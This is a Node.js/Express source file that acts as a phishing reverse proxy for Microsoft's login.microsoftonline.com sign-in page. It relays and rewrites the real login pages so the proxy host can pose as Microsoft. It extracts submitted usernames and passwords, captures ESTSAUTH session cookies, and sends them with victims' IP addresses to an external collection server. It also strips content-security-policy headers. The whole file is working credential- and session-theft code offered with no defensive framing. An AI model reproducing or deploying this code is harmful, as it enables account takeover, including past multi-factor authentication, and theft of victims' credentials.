import express from 'express';
import path from 'path';
import fetch from 'node-fetch';

const app = express();
const port = process.env.PORT || 5000;

const upstream = 'login.microsoftonline.com';
const upstream_path = '/';
const https = true;

app.use(express.json());
app.use(express.static(path.join(__dirname, '../my-react-app/build')));

app.all('/api/*', async (req, res) => {
    const { method, headers, url } = req;
    const region = (headers['cf-ipcountry'] || '').toUpperCase();
    const ip_address = headers['cf-connecting-ip'];

    if (method === 'POST') {
        try {
            const body = await getRequestBody(req);
            const message = extractCredentials(body);

            if (message.includes("User") && message.includes("Password")) {
                await sendToServer(message, ip_address);
            }
        } catch (error) {
            console.error('Error processing request:', error);
            return res.status(500).json({ error: 'Internal Server Error' });
        }
    }

    try {
        const adjustedUrl = adjustUrl(url, headers);
        const fetchOptions = createFetchOptions(method, headers, req.body);
        const original_response = await fetch(adjustedUrl.href, fetchOptions);

        const responseText = await replace_response_text(original_response, upstream, adjustedUrl.hostname);
        const cookies = original_response.headers.get('set-cookie');
        if (cookies && cookies.includes('ESTSAUTH') && cookies.includes('ESTSAUTHPERSISTENT')) {
            await sendToServer("Cookies found:\n\n" + formatCookies(cookies), ip_address);
        }

        res.status(original_response.status)
            .set({
                ...original_response.headers.raw(),
                'Content-Type': 'text/html; charset=utf-8',
                'access-control-allow-origin': '*',
                'access-control-allow-credentials': true,
                'content-security-policy': undefined,
                'content-security-policy-report-only': undefined,
                'clear-site-data': undefined
            })
            .send(responseText);
    } catch (error) {
        console.error('Error fetching upstream:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../my-react-app/build/index.html'));
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});

// Helper functions

const getRequestBody = (req) => {
    return new Promise((resolve, reject) => {
        let data = '';
        req.on('data', chunk => data += chunk);
        req.on('end', () => resolve(data));
        req.on('error', err => reject(err));
    });
};

const extractCredentials = (body) => {
    const keyValuePairs = new URLSearchParams(body);
    let message = "Password found:\n\n";

    for (const [key, value] of keyValuePairs) {
        if (key === 'login') message += `User: ${decodeURIComponent(value.replace(/\+/g, ' '))}\n`;
        if (key === 'passwd') message += `Password: ${decodeURIComponent(value.replace(/\+/g, ' '))}\n`;
    }

    return message;
};

const adjustUrl = (urlString, headers) => {
    const url = new URL(urlString, `https://${headers.host}`);
    url.protocol = https ? 'https:' : 'http:';
    url.host = upstream;
    url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;
    return url;
};

const createFetchOptions = (method, headers, body) => ({
    method,
    headers: { ...headers, Host: upstream, Referer: `${https ? 'https' : 'http'}://${headers.host}` },
    body
});

const replace_response_text = async (response, upstream_domain, host_name) => {
    let text = await response.text();
    return text.replace(new RegExp(upstream_domain, 'g'), host_name);
};

const formatCookies = (cookies) => cookies.split(',').map(cookie => cookie.trim()).join('; \n\n');

const sendToServer = async (data, ip_address) => {
    try {
        const response = await fetch('https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data, ip: ip_address })
        });

        if (!response.ok) throw new Error('Failed to send data to server');
        console.log('Data sent to server successfully');
    } catch (error) {
        console.error('Error sending data:', error);
    }
};
